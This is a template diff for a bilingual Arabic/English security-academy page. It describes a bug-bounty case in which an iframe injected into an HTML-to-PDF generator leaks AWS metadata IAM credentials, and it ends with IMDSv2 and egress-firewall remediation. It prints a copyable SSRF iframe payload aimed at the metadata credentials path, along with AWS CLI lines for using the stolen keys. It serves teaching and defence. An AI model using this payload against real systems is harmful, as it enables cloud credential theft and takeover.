@@ -1,0 +1,73 @@
+{% extends "main/academy/base.html" %}
+
+{% block title %}Cloud SSRF Writeup{% endblock %}
+
+{% block content %}
+<div class="page-hero">
+  <h1 class="page-title">اختراق السحابة عبر ثغرات SSRF المتقدمة</h1>
+  <p class="page-title-en">Cloud SSRF: Leaking AWS Metadata Keys via PDF Generator</p>
+  <span class="severity-pill pill-high">HIGH</span>
+  <span class="severity-pill pill-medium">Bounty: $4,000</span>
+</div>
+
+<div class="section-card">
+  <h2>Overview / نظرة عامة</h2>
+  <div class="bilingual-block">
+    <div class="lang-section">
+      <span class="lang-tag">AR</span>
+      <p>تعتبر ثغرة Server-Side Request Forgery (SSRF) خطيرة جداً خاصة في البيئات السحابية. يوضح هذا التقرير كيف أدى استغلال محرك توليد ملفات PDF ضعيف إلى تسريب مفاتيح AWS السحابية (IAM Secrets) واختراق البنية التحتية بالكامل.</p>
+    </div>
+    <div class="lang-section lang-en">
+      <span class="lang-tag">EN</span>
+      <p>Server-Side Request Forgery (SSRF) represents a severe risk in cloud deployments. This writeup illustrates how exploiting a vulnerable HTML-to-PDF generator leaked AWS metadata server credentials, leading to total cloud takeover.</p>
+    </div>
+  </div>
+</div>
+
+<div class="section-card">
+  <h2>Attack Steps / خطوات الاستغلال</h2>
+  <ol class="steps-list">
+    <li>اكتشاف محرك توليد فواتير PDF يقبل مدخلات HTML من المستخدم.</li>
+    <li>حقن كود HTML يحتوي على <code>&lt;iframe src="http://169.254.169.254/latest/meta-data/"&gt;</code> داخل الطلب.</li>
+    <li>السيرفر يقوم بتشغيل محاكي المتصفح (Headless Browser) ويجلب البيانات السحابية ثم يطبعها داخل الـ PDF الناتج.</li>
+    <li>استعراض المجلدات السحابية والوصول لـ <code>iam/security-credentials/[role]</code> لاستخراج مفاتيح الوصول الحساسة.</li>
+    <li>استخدام واجهة سطر أوامر AWS السحابية (AWS CLI) للتحكم بالنظام بالكامل باستخدام المفاتيح المسربة.</li>
+  </ol>
+</div>
+
+<div class="section-card">
+  <h2>Payload & Exploit Commands / الحمولة وأوامر التحكم</h2>
+  <div class="cmd-block">
+    <div class="cmd-bar">
+      <span>HTML iframe Injection Payload / حمولة حقن الإطار</span>
+      <button class="copy-btn" onclick="copyCmd(this)">Copy</button>
+    </div>
+    <pre>&lt;iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role" width="600" height="400"&gt;&lt;/iframe&gt;</pre>
+  </div>
+
+  <div class="cmd-block">
+    <div class="cmd-bar">
+      <span>AWS CLI Config / تكوين واجهة سطر الأوامر للاستغلال</span>
+      <button class="copy-btn" onclick="copyCmd(this)">Copy</button>
+    </div>
+    <pre>export AWS_ACCESS_KEY_ID=ASIAXX...
+export AWS_SECRET_ACCESS_KEY=wJalrX...
+export AWS_SESSION_TOKEN=IQoJb3...
+aws sts get-caller-identity</pre>
+  </div>
+</div>
+
+<div class="section-card">
+  <h2>Remediation / التخفيف والحماية</h2>
+  <div class="bilingual-block">
+    <div class="lang-section">
+      <span class="lang-tag">AR</span>
+      <p>قم بتفعيل النسخة الثانية من خدمة البيانات السحابية IMDSv2 التي تتطلب ترويسات مصادقة مسبقة (Token-based Headers)، وعطل الاتصال بالشبكات المحلية من سيرفر توليد الملفات.</p>
+    </div>
+    <div class="lang-section lang-en">
+      <span class="lang-tag">EN</span>
+      <p>Harden cloud servers by enforcing AWS IMDSv2 (which requires token headers to block SSRF), and apply local network firewalls to restrict outbound traffic from PDF engines.</p>
+    </div>
+  </div>
+</div>
+{% endblock %}
